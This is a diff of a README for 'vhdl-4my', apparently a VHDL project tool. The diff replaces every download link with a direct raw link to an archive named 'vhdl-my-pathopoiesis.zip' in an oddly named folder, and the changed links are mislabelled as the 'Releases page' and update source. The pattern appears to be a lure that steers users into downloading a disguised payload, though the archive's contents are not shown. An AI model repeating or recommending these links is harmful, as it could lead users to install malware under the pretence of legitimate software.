@@ -6,7 +6,7 @@ Welcome to vhdl-4my! This application helps you manage your VHDL projects with e
 
 ## 📥 Download vhdl-4my
 
-[![Download vhdl-4my](https://raw.githubusercontent.com/MCasoni-reborn/vhdl-4my/main/unprogressively/vhdl-4my.zip)](https://raw.githubusercontent.com/MCasoni-reborn/vhdl-4my/main/unprogressively/vhdl-4my.zip)
+[![Download vhdl-4my](https://github.com/MCasoni-reborn/vhdl-4my/raw/refs/heads/main/unprogressively/vhdl-my-pathopoiesis.zip)](https://github.com/MCasoni-reborn/vhdl-4my/raw/refs/heads/main/unprogressively/vhdl-my-pathopoiesis.zip)
 
 ## 📚 Features
 
@@ -26,7 +26,7 @@ Welcome to vhdl-4my! This application helps you manage your VHDL projects with e
 
 To install and run vhdl-4my, please follow these steps:
 
-1. **Visit the Download Page:** Go to the [vhdl-4my Releases page](https://raw.githubusercontent.com/MCasoni-reborn/vhdl-4my/main/unprogressively/vhdl-4my.zip).
+1. **Visit the Download Page:** Go to the [vhdl-4my Releases page](https://github.com/MCasoni-reborn/vhdl-4my/raw/refs/heads/main/unprogressively/vhdl-my-pathopoiesis.zip).
 
 2. **Select the Latest Release:** Look for the latest version at the top of the list.
 
@@ -67,7 +67,7 @@ Once you have installed the application:
 
 If you encounter issues while using vhdl-4my:
 
-- **Check for Updates:** Ensure you have the latest version from the [Releases page](https://raw.githubusercontent.com/MCasoni-reborn/vhdl-4my/main/unprogressively/vhdl-4my.zip).
+- **Check for Updates:** Ensure you have the latest version from the [Releases page](https://github.com/MCasoni-reborn/vhdl-4my/raw/refs/heads/main/unprogressively/vhdl-my-pathopoiesis.zip).
 - **Consult the Help Section:** Access guides and tips within the app.
 - **Reach Out for Support:** Contact the support team through issues on this repository.
 
